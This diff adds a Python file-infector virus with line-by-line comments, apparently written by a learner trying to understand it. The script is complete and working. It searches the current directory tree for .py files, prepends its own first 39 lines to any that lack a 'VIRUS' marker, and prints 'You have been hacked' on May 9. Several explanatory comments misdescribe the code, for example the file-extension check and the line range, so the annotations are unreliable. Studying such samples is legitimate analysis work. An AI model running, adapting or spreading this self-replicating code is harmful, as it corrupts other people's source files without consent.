@@ -1,0 +1,49 @@
+#!/usr/bin/python3
+import os # This is importing the os library from python
+import datetime # This is importing the datetime library
+
+SIGNATURE = "VIRUS" # Declaring a variable
+# What this function seems to do is to get all files in the current folder and adding them to a list
+def locate(path):
+    files_targeted = [] # An empty list probably to be filled out later with files
+    filelist = os.listdir(path) # This is filling a variable with directories that is in this folder
+    for fname in filelist: # This is a loop that is going to keep going as long as there are files or folders
+        if os.path.isdir(path+"/"+fname): # checking to see if the file is a folder or not
+            files_targeted.extend(locate(path+"/"+fname)) # If it is a folder, add to files_targeted list
+        elif fname[-3:] == ".py": # If the second to the last file is a python script
+            infected = False # And if it's not infected
+            for line in open(path+"/"+fname): # Then open the file and start checking lines
+                if SIGNATURE in line: # And if the signature is there
+                    infected = True # Then ignore it, so the virus doesn't infect it's self
+                    break # And exit the loop
+            if infected == False: # If the file doesn't return a signature in any line of code
+                files_targeted.append(path+"/"+fname) # Add to files_targeted
+    return files_targeted # Return the list of all files targeted
+# This function is taking in the targeted list from the last function as a parameter and using it to
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__)) # Open a file from one of the files in files_targeted
+    virusstring = "" # Declaring an empty variable
+    for i,line in enumerate(virus): # Taking the file and checking the lines in the file
+        if 0 <= i < 39: # If the line is between 0 and 35
+            virusstring += line # Make a new line
+    virus.close # Closing the file
+    for fname in files_targeted: # Making a loop for all files in files_targeted
+        f = open(fname) # Open the file
+        temp = f.read() # Setting temp as opening the file
+        f.close() # closing the file
+        f = open(fname,"w") # Opening the file in write mode
+        f.write(virusstring + temp) # Write open(fname)
+        f.close()
+# This function appears to print to the screen if the system date reads May 9th
+def detonate():
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # checking to see if it's may 9th
+        print("You have been hacked") # If so, print this
+
+files_targeted = locate(os.path.abspath("")) # Figuring out what working directory it is in, grabbing all files and return it
+infect(files_targeted) # Infecting all files from the list returned from the previous function
+detonate() # And when May 9th comes around, let everyone know that they have been hacked
+
+# What this code seems to do is that it scans all the files of where it is at, then makes a list of all the files
+# That end with .py and if it's a directory, repeat the function until it has grabbed all the files in the current
+# Working directory and the directories after that and then constantly put new lines as long as its not one line 0
+# or on line 39. Then when someone tampered with the system clock to May 9th, that script will print, You've been hacked
